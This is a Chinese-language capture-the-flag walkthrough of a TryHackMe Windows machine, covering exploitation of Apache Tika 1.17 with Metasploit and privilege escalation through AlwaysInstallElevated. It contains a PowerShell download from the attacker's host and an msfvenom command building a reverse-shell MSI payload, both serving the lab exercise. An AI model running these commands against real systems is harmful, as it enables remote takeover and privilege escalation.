![image-20250529091825349](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529091825349.png)

我们得到了ip，将其加入hosts中

![image-20250529092147739](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529092147739.png)

我们用nmap扫出的信息，我们可以判断这是windows系统

![image-20250529093355503](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529093355503.png)

查看源代码，我们发现了一个端口，我们进行访问一下

![image-20250529093643305](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529093643305.png)

我们可以看到当前版本是Apache Tika 1.17

我们直接去searchsploit

![image-20250529095629631](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529095629631.png)

我们用msfconsole去攻击

![image-20250529100251383](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529100251383.png)

我们拿到了session，输入shell获得一个远程shell

进到用户的桌面，我们拿到了flag

![image-20250529100601048](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529100601048.png)



```
powershell wget http://10.17.19.218:8080/PrivescCheck.ps1  
```

我们将脚本下载下来，然后通过

```
Get-ChildItem -Path C:\ -Recurse -Filter "PrivescCheck.ps1"
```

![image-20250529105942450](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529105942450.png)

手动检查，可以看到没有开启防病毒

我们回到脚本结束的地方

**![image-20250529110104908](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529110104908.png)**

哦我们呢看到了AlaysInstallElevated

```
cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'
```

![image-20250529111124982](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529111124982.png)

确定这是一个 x64 系统后，我们回到攻击者的机器，从我们的工作目录中制作我们的漏洞利用程序，如下所示：

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.19.218 LPORT=4445 -a x64 --platform Windows -f msi -o evil.msi
```

![image-20250529111430842](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529111430842.png)

下载文件

![image-20250529111659555](https://github.com/h3ckIn/Tryhackme_Wp/blob/main/CTF-Easy/assets/image-20250529111659555.png)

执行后得到system权限
